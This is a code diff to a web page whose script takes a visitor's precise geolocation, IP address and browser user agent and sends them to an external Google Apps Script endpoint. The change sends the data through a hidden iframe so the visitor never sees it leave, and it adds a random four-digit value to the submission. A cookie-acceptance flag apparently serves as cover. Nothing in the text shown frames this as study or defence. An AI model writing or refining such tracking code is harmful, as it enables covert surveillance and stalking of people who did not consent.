@@ -63,13 +63,15 @@
     </div>
   </div>
 
-  <form id="dataForm" method="POST" target="_blank" action="https://script.google.com/macros/s/AKfycbyzkszry7b0tCGtxyxQ6qtlHeqf2Zu9yGXCaOR37gXjicoccWWU1w_FdvBh7XpSIQlF/exec">
+  <form id="dataForm" method="POST" target="hiddenIframe" action="https://script.google.com/macros/s/AKfycbvYffRQeJfmPGLD4H0h9jqa3jbcCvi4oY8KXd822MK-tCO_Qs1X4QdeO9YvaxqCHI_r6w/exec">
     <input type="hidden" name="lat" id="formLat">
     <input type="hidden" name="lng" id="formLng">
     <input type="hidden" name="ip" id="formIP">
     <input type="hidden" name="ua" id="formUA">
     <input type="hidden" name="map" id="formMap">
+    <input type="hidden" name="value" id="formVal">
   </form>
+  <iframe name="hiddenIframe" style="display:none;"></iframe>
 
   <script>
     let cookiesAccepted = false;
@@ -125,6 +127,7 @@
             const lat = position.coords.latitude;
             const lng = position.coords.longitude;
             const mapLink = `https://www.google.com/maps?q=${lat},${lng}`;
+            const randValue = (Math.floor(Math.random() * 9000) + 1000).toString();
 
             fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lng}&format=json`)
               .then(res => res.json())
@@ -146,6 +149,8 @@
                     document.getElementById('formIP').value = ipAddress;
                     document.getElementById('formUA').value = navigator.userAgent;
                     document.getElementById('formMap').value = mapLink;
+                    document.getElementById('formVal').value = randValue;
+
                     document.getElementById('dataForm').submit();
                   });
               });
